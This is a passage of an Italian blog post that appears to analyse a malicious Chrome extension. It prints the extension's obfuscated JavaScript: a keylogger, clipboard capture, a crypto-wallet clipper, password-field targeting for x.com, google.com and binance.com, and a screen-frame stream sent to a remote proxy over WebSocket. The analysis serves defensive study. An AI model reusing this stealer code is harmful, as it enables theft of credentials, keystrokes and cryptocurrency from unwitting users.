+</span></span><span class="line"><span class="ln"> 39</span><span class="cl">      <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="p">[</span><span class="nx">_0x2ad4d3</span><span class="p">,</span> <span class="nx">_0x2a028f</span><span class="p">]</span> <span class="k">of</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">INPUTS_CONFIG</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 40</span><span class="cl">        <span class="kr">const</span> <span class="nx">_0x5905e3</span> <span class="o">=</span> <span class="nx">globToRegex</span><span class="p">(</span><span class="nx">_0x2ad4d3</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">(),</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 41</span><span class="cl">          <span class="s1">&#39;exact&#39;</span><span class="o">:</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="ln"> 42</span><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 43</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5905e3</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">()))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 44</span><span class="cl">          <span class="nx">_0x1d96dd</span><span class="p">.</span><span class="nx">push</span><span class="p">(...</span><span class="nx">_0x2a028f</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 45</span><span class="cl">          <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 46</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 47</span><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 48</span><span class="cl">      <span class="nx">_0x3df652</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln"> 49</span><span class="cl">        <span class="s1">&#39;status&#39;</span><span class="o">:</span> <span class="s1">&#39;OK&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 50</span><span class="cl">        <span class="s1">&#39;config&#39;</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 51</span><span class="cl">          <span class="s1">&#39;sites&#39;</span><span class="o">:</span> <span class="p">[</span><span class="s2">&#34;x.com&#34;</span><span class="p">,</span> <span class="s2">&#34;google.com&#34;</span><span class="p">,</span> <span class="s2">&#34;binance.com&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="ln"> 52</span><span class="cl">          <span class="s1">&#39;injects&#39;</span><span class="o">:</span> <span class="nx">_0x13a322</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 53</span><span class="cl">          <span class="s1">&#39;keylogger&#39;</span><span class="o">:</span> <span class="nx">KEYLOGGER_CONFIG</span><span class="p">.</span><span class="nx">enabled</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 54</span><span class="cl">          <span class="s1">&#39;inputs&#39;</span><span class="o">:</span> <span class="nx">_0x1d96dd</span>
+</span></span><span class="line"><span class="ln"> 55</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 56</span><span class="cl">      <span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 57</span><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 58</span><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">action</span> <span class="o">===</span> <span class="s2">&#34;fetch-offscreen-config&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 59</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">gpu</span> <span class="o">&amp;&amp;</span> <span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">gpu</span><span class="p">.</span><span class="nx">renderer</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 60</span><span class="cl">          <span class="nx">sendGpuData</span><span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">gpu</span><span class="p">.</span><span class="nx">renderer</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 61</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 62</span><span class="cl">        <span class="nx">_0x3df652</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln"> 63</span><span class="cl">          <span class="s1">&#39;coins&#39;</span><span class="o">:</span> <span class="nx">CLIPPER_COINS</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 64</span><span class="cl">          <span class="s1">&#39;lastCoins&#39;</span><span class="o">:</span> <span class="nx">LAST_CLIPPER_COINS</span>
+</span></span><span class="line"><span class="ln"> 65</span><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 66</span><span class="cl">      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 67</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">action</span> <span class="o">===</span> <span class="s2">&#34;keypress&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 68</span><span class="cl">          <span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nx">query</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln"> 69</span><span class="cl">            <span class="s1">&#39;active&#39;</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 70</span><span class="cl">            <span class="s1">&#39;currentWindow&#39;</span><span class="o">:</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="ln"> 71</span><span class="cl">          <span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">_0x3dee1e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 72</span><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">_0x3dee1e</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">shouldKeylogForUrl</span><span class="p">(</span><span class="nx">_0x3dee1e</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">url</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 73</span><span class="cl">              <span class="kd">var</span> <span class="nx">_0x4b2d95</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 74</span><span class="cl">              <span class="k">if</span> <span class="p">(</span><span class="nx">KEYLOGGER_URL</span> <span class="o">!=</span> <span class="nx">_0x3dee1e</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 75</span><span class="cl">                <span class="nx">KEYLOGGER_URL</span> <span class="o">=</span> <span class="nx">_0x3dee1e</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">url</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 76</span><span class="cl">                <span class="kr">const</span> <span class="nx">_0x516882</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">toISOString</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 77</span><span class="cl">                <span class="nx">_0x4b2d95</span> <span class="o">+=</span> <span class="s2">&#34;\n\n[&#34;</span> <span class="o">+</span> <span class="nx">_0x516882</span> <span class="o">+</span> <span class="s2">&#34;] &#34;</span> <span class="o">+</span> <span class="nx">_0x3dee1e</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">title</span> <span class="o">+</span> <span class="s2">&#34; - &#34;</span> <span class="o">+</span> <span class="nx">KEYLOGGER_URL</span> <span class="o">+</span> <span class="s2">&#34;\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 78</span><span class="cl">              <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 79</span><span class="cl">              <span class="nx">_0x4b2d95</span> <span class="o">+=</span> <span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">key</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 80</span><span class="cl">              <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;keys_data&#34;</span><span class="p">,</span> <span class="nx">_0x237da8</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 81</span><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">_0x237da8</span><span class="p">.</span><span class="nx">keys_data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 82</span><span class="cl">                  <span class="nx">_0x237da8</span><span class="p">.</span><span class="nx">keys_data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 83</span><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 84</span><span class="cl">                <span class="nx">_0x237da8</span><span class="p">.</span><span class="nx">keys_data</span> <span class="o">+=</span> <span class="nx">_0x4b2d95</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 85</span><span class="cl">                <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">set</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln"> 86</span><span class="cl">                  <span class="s1">&#39;keys_data&#39;</span><span class="o">:</span> <span class="nx">_0x237da8</span><span class="p">.</span><span class="nx">keys_data</span>
+</span></span><span class="line"><span class="ln"> 87</span><span class="cl">                <span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 88</span><span class="cl">              <span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 89</span><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 90</span><span class="cl">          <span class="p">});</span>
+</span></span><span class="line"><span class="ln"> 91</span><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 92</span><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">action</span> <span class="o">===</span> <span class="s2">&#34;clip-update&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">KEYLOGGER_CONFIG</span><span class="p">.</span><span class="nx">mode</span> <span class="o">!==</span> <span class="s2">&#34;off&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 93</span><span class="cl">            <span class="kr">const</span> <span class="nx">_0xc5996b</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">toISOString</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 94</span><span class="cl">            <span class="kd">var</span> <span class="nx">_0x126d0c</span> <span class="o">=</span> <span class="s2">&#34;\n\n[&#34;</span> <span class="o">+</span> <span class="nx">_0xc5996b</span> <span class="o">+</span> <span class="s2">&#34;] Clipboard\n&#34;</span> <span class="o">+</span> <span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">text</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 95</span><span class="cl">            <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;keys_data&#34;</span><span class="p">,</span> <span class="nx">_0x44b026</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 96</span><span class="cl">              <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">_0x44b026</span><span class="p">.</span><span class="nx">keys_data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 97</span><span class="cl">                <span class="nx">_0x44b026</span><span class="p">.</span><span class="nx">keys_data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 98</span><span class="cl">              <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 99</span><span class="cl">              <span class="nx">_0x44b026</span><span class="p">.</span><span class="nx">keys_data</span> <span class="o">+=</span> <span class="nx">_0x126d0c</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">100</span><span class="cl">              <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">set</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln">101</span><span class="cl">                <span class="s1">&#39;keys_data&#39;</span><span class="o">:</span> <span class="nx">_0x44b026</span><span class="p">.</span><span class="nx">keys_data</span>
+</span></span><span class="line"><span class="ln">102</span><span class="cl">              <span class="p">});</span>
+</span></span><span class="line"><span class="ln">103</span><span class="cl">            <span class="p">});</span>
+</span></span><span class="line"><span class="ln">104</span><span class="cl">          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">105</span><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">action</span> <span class="o">===</span> <span class="s2">&#34;new-form&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">106</span><span class="cl">              <span class="nx">processNewForm</span><span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">form</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">107</span><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">108</span><span class="cl">              <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">action</span> <span class="o">===</span> <span class="s2">&#34;new-fetch&#34;</span><span class="p">)</span> <span class="p">{}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">109</span><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">action</span> <span class="o">===</span> <span class="s2">&#34;new-checker&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">110</span><span class="cl">                  <span class="nx">sendCheckerResult</span><span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">111</span><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">action</span> <span class="o">===</span> <span class="s2">&#34;clipboard-log&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">112</span><span class="cl">                  <span class="nx">processClipboardLog</span><span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">text</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">113</span><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="ln">114</span><span class="cl">              <span class="p">}</span>
+</span></span><span class="line"><span class="ln">115</span><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="ln">116</span><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="ln">117</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">118</span><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="ln">119</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">120</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">121</span><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>È qui che confluisce tutto ciò che il content script cattura dalle pagine, e in base al tipo di messaggio il malware lo smista per processarlo con una funzione apposita, probabilmente per farne il parsing.</p>
+<p>Registra i tasti premuti (keylogger), accumulandoli in un archivio locale nascosto, e cattura il contenuto del clipboard (quello che ho nel buffer di copia):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">action</span> <span class="o">===</span> <span class="s2">&#34;keypress&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="nx">chrome</span><span class="p">.</span><span class="nx">tabs</span><span class="p">.</span><span class="nx">query</span><span class="p">({</span> <span class="nx">active</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">currentWindow</span><span class="o">:</span> <span class="kc">true</span> <span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">tabs</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">tabs</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">shouldKeylogForUrl</span><span class="p">(</span><span class="nx">tabs</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">url</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">      <span class="kd">var</span> <span class="nx">entry</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">KEYLOGGER_URL</span> <span class="o">!=</span> <span class="nx">tabs</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>          <span class="c1">// cambio pagina e quindi nuova intestazione
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="c1"></span>        <span class="nx">KEYLOGGER_URL</span> <span class="o">=</span> <span class="nx">tabs</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">url</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">        <span class="nx">entry</span> <span class="o">+=</span> <span class="s2">&#34;\n\n[&#34;</span> <span class="o">+</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">toISOString</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;] &#34;</span> <span class="o">+</span> <span class="nx">tabs</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">title</span> <span class="o">+</span> <span class="s2">&#34; - &#34;</span> <span class="o">+</span> <span class="nx">KEYLOGGER_URL</span> <span class="o">+</span> <span class="s2">&#34;\n&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">      <span class="nx">entry</span> <span class="o">+=</span> <span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">key</span><span class="p">;</span>                        <span class="c1">// il tasto premuto
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"></span>      <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;keys_data&#34;</span><span class="p">,</span> <span class="nx">d</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="nx">d</span><span class="p">.</span><span class="nx">keys_data</span> <span class="o">=</span> <span class="p">(</span><span class="nx">d</span><span class="p">.</span><span class="nx">keys_data</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nx">entry</span><span class="p">;</span>   <span class="c1">// accumula
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1"></span>        <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">set</span><span class="p">({</span> <span class="nx">keys_data</span><span class="o">:</span> <span class="nx">d</span><span class="p">.</span><span class="nx">keys_data</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">      <span class="p">});</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">action</span> <span class="o">===</span> <span class="s2">&#34;clip-update&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">KEYLOGGER_CONFIG</span><span class="p">.</span><span class="nx">mode</span> <span class="o">!==</span> <span class="s2">&#34;off&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">  <span class="kd">var</span> <span class="nx">entry</span> <span class="o">=</span> <span class="s2">&#34;\n\n[&#34;</span> <span class="o">+</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">toISOString</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;] Clipboard\n&#34;</span> <span class="o">+</span> <span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">text</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">  <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&#34;keys_data&#34;</span><span class="p">,</span> <span class="nx">d</span> <span class="p">=&gt;</span> <span class="p">{</span>       <span class="c1">// non dimentichiamoci il clipboard
+</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="c1"></span>    <span class="nx">d</span><span class="p">.</span><span class="nx">keys_data</span> <span class="o">=</span> <span class="p">(</span><span class="nx">d</span><span class="p">.</span><span class="nx">keys_data</span> <span class="o">||</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nx">entry</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="nx">chrome</span><span class="p">.</span><span class="nx">storage</span><span class="p">.</span><span class="nx">local</span><span class="p">.</span><span class="nx">set</span><span class="p">({</span> <span class="nx">keys_data</span><span class="o">:</span> <span class="nx">d</span><span class="p">.</span><span class="nx">keys_data</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>È presente un clipper: un modulo che sorveglia gli indirizzi di wallet crypto copiati negli appunti e li sostituisce al volo con quelli dell&rsquo;attaccante.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">action</span> <span class="o">===</span> <span class="s2">&#34;fetch-offscreen-config&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">gpu</span> <span class="o">&amp;&amp;</span> <span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">gpu</span><span class="p">.</span><span class="nx">renderer</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="nx">sendGpuData</span><span class="p">(</span><span class="nx">_0x5d76b4</span><span class="p">.</span><span class="nx">gpu</span><span class="p">.</span><span class="nx">renderer</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">  <span class="nx">_0x3df652</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">    <span class="nx">coins</span><span class="o">:</span> <span class="nx">CLIPPER_COINS</span><span class="p">,</span>          <span class="c1">// indirizzi wallet dell&#39;attaccante (BTC, LTC, TRON, ...)
+</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="c1"></span>    <span class="nx">lastCoins</span><span class="o">:</span> <span class="nx">LAST_CLIPPER_COINS</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="p">});</span>
+</span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Inoltre la configurazione è totalmente dinamica e si adatta al dominio della pagina visitata:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">config</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="nx">sites</span><span class="o">:</span> <span class="p">[</span><span class="s2">&#34;x.com&#34;</span><span class="p">,</span> <span class="s2">&#34;google.com&#34;</span><span class="p">,</span> <span class="s2">&#34;binance.com&#34;</span><span class="p">],</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">  <span class="nx">injects</span><span class="o">:</span> <span class="p">[...],</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">  <span class="nx">keylogger</span><span class="o">:</span> <span class="nx">KEYLOGGER_CONFIG</span><span class="p">.</span><span class="nx">enabled</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">  <span class="nx">inputs</span><span class="o">:</span> <span class="p">[</span><span class="s2">&#34;input[type=\&#34;password\&#34;]&#34;</span><span class="p">,</span> <span class="p">...]</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>La cosa inquietante è che è predisposto anche per catturare eventi del tipo <code>captureScreenshot</code>.</p>
+<h4 id="il-listener-video">Il listener video</h4>
+<p>Proprio quando credevo che la cosa fosse limitata &ldquo;solo&rdquo; a questo, noto la presenza di un altro listener a monte di quello utilizzato da <code>content.js</code>, associato all&rsquo;info stealer. Mentre nel primo la raccolta d&rsquo;informazioni era testuale, questo gestisce un flusso completamente diverso: <strong>i fotogrammi dello schermo</strong>!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">chrome</span><span class="p">.</span><span class="nx">runtime</span><span class="p">.</span><span class="nx">onMessage</span><span class="p">.</span><span class="nx">addListener</span><span class="p">((</span><span class="nx">msg</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">source</span> <span class="o">===</span> <span class="s2">&#34;offscreen&#34;</span> <span class="o">&amp;&amp;</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">type</span> <span class="o">===</span> <span class="s2">&#34;encoded_frame&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kr">const</span> <span class="nx">client</span> <span class="k">of</span> <span class="nx">serverInstance</span><span class="p">.</span><span class="nx">connectedClients</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">      <span class="nx">serverInstance</span><span class="p">.</span><span class="nx">proxyWebSocket</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">MessagePack</span><span class="p">.</span><span class="nx">encode</span><span class="p">({</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">        <span class="nx">type</span><span class="o">:</span> <span class="s2">&#34;video_frame&#34;</span><span class="p">,</span> <span class="nx">client_id</span><span class="o">:</span> <span class="nx">client</span><span class="p">,</span> <span class="nx">data</span><span class="o">:</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">data</span><span class="p">),</span> <span class="p">...</span>
+</span></span><span class="line"><span class="ln">6</span><span class="cl">      <span class="p">}));</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">8</span><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="ln">9</span><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>In particolare si può notare come il flusso video è inviato a un <code>proxyWeb</code> inizializzato poco più giù con una classe chiamata <code>CDPServerProxy</code>:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">startServer</span><span class="p">(</span><span class="nx">_0x442279</span><span class="p">,</span> <span class="nx">_0x57e288</span><span class="p">,</span> <span class="nx">_0x166eae</span><span class="p">,</span> <span class="nx">_0x209f9e</span><span class="p">,</span> <span class="nx">_0x35ef1b</span><span class="p">,</span> <span class="nx">_0x1cf597</span><span class="p">,</span> <span class="nx">_0x558178</span><span class="p">,</span> <span class="nx">_0x3e622e</span><span class="p">,</span> <span class="nx">_0xd3c5bf</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="kd">var</span> <span class="nx">_0x517146</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
